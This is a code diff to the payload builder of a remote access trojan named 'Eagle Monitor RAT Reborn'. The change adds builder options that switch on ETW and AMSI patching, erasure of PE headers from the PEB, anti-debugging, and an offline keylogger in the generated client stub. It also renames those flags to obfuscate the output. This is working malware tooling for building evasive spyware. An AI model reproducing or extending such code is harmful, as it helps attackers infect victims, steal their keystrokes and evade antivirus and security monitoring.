@@ -5,8 +5,6 @@ using System.IO;
 using System.Text;
 using System.Windows.Forms;
 using dnlib.DotNet;
-using Eagle_Monitor_RAT_Reborn.Controls;
-using static Eagle_Monitor_RAT_Reborn.Network.ClientHandler;
 
 /* 
 || AUTHOR Arsium ||
@@ -56,10 +54,47 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 if (Program.mainForm.offKeyloguna2CheckBox.Checked)
                 {
                     LogStep("Setting offline keylogger..." + Environment.NewLine);
-                    stub = stub.Replace("static bool offKeylog = false;", "static bool offKeylog = true;");
+                    stub = stub.Replace("bool offKeylog = false;", "bool offKeylog = true;");
                 }
                 else
                     LogStep("Skipping offline keylogger..." + Environment.NewLine);
+
+
+                if (Program.mainForm.patchETWGuna2CheckBox.Checked)
+                {
+                    LogStep("Setting etw patch..." + Environment.NewLine);
+                    stub = stub.Replace("bool blockETW = false;", "bool blockETW = true;");
+                }
+                else
+                    LogStep("Skipping etw patch..." + Environment.NewLine);
+
+
+                if (Program.mainForm.patchAMSIGuna2CheckBox.Checked)
+                {
+                    LogStep("Setting amsi patch..." + Environment.NewLine);
+                    stub = stub.Replace("bool blockAMSI = false;", "bool blockAMSI = true;");
+                }
+                else
+                    LogStep("Skipping amsi patch..." + Environment.NewLine);
+
+
+                if (Program.mainForm.erasePEHeadersGuna2CheckBox.Checked)
+                {
+                    LogStep("Setting PE headers eraser..." + Environment.NewLine);
+                    stub = stub.Replace("bool erasePEFromPEB = false;", "bool erasePEFromPEB = true;");
+                }
+                else
+                    LogStep("Skipping PE headers eraser..." + Environment.NewLine);
+
+
+                if (Program.mainForm.antiDebugGuna2CheckBox.Checked)
+                {
+                    LogStep("Setting anti-debug..." + Environment.NewLine);
+                    stub = stub.Replace("bool antiDBG = false;", "bool antiDBG = true;");
+                }
+                else
+                    LogStep("Skipping anti-debug..." + Environment.NewLine);
+
 
                 LogStep("Renaming code..." + Environment.NewLine);
 
@@ -67,7 +102,6 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 stub = Rename(stub, "hostLists");
                 stub = Rename(stub, "generalKey");
                 stub = Rename(stub, "Config");
-                stub = Rename(stub, "offKeylog");
                 stub = Rename(stub, "installationParam");
                 stub = Rename(stub, "installationMethod");
                 stub = Rename(stub, "StarterClass");
@@ -88,7 +122,7 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 stub = Rename(stub, "EndPacketRead");
                 stub = Rename(stub, "SendDataCompleted");
                 stub = Rename(stub, "EndConnect");
-
+                //
                 stub = Rename(stub, "ReadDataAsync");
                 stub = Rename(stub, "readDataAsync");
 
@@ -101,6 +135,12 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 stub = Rename(stub, "SendDataAsync");
                 stub = Rename(stub, "sendDataAsync");
                 stub = Rename(stub, "SendData");
+                //
+                stub = Rename(stub, "offKeylog");
+                stub = Rename(stub, "antiDBG");
+                stub = Rename(stub, "erasePEFromPEB");
+                stub = Rename(stub, "blockAMSI");
+                stub = Rename(stub, "blockETW");
 
                 File.WriteAllText(Application.StartupPath + "\\Stubs\\clienttmp.cs", stub);
 
